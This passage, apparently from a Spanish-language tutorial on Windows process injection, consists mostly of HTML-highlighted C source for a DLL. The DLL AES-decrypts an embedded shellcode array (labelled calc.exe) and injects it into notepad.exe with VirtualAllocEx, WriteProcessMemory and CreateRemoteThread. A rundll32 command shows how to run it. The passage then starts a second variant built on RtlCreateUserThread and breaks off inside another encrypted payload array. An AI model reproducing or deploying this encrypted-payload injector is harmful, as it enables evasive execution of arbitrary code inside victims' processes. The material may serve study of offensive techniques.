class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>

<span class="c1">// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_CLIENT_ID</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span><span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">VirtualAlloc_t</span><span class="p">)(</span>
	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
	
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlMoveMemory_t</span><span class="p">)(</span>
	<span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> 
	<span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> 
	<span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">FARPROC</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlCreateUserThread_t</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PSECURITY_DESCRIPTOR</span> <span class="n">SecurityDescriptor</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">CreateSuspended</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackReserved</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartParameter</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateThreadEx_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">lpBytesBuffer</span><span class="p">);</span>


<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>

<span class="kt">int</span> <span class="n">AESDecrypt</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
        <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
        <span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>
		<span class="n">DWORD</span> <span class="o">*</span> <span class="n">pointer_len</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">payload_len</span><span class="p">;</span> 
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">pointer_len</span><span class="p">)){</span>
                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
        <span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>  
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="n">FindProcess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//se crear un snapshot de los procesos en ejecución del sistema operativo</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// se obtiene el tamaño total del objeo definido</span>
                
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// validación del snapshot creado</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
                
        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// iteración del snapshot</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"[FindProcess: ] %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// comprobación del nombre del proceso</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span> <span class="c1">// obtención del pid del proceso</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">"Process Found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
                
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span> <span class="c1">//se cierra el snapshot</span>
                
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span> <span class="c1">// retorno de pid</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="n">Inject</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
	
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>	
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindProcess</span><span class="p">(</span><span class="s">"notepad.exe"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Notepad.exe PID = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ejecución:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe external_injection_dll_1.dll,f0ns1
</code></pre></div></div>

<h4 id="dll-prtlcreateuserthread">Dll pRtlCreateUserThread()</h4>

<p>Código asociado al binario:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>
<span class="c1">// calc.exe</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span 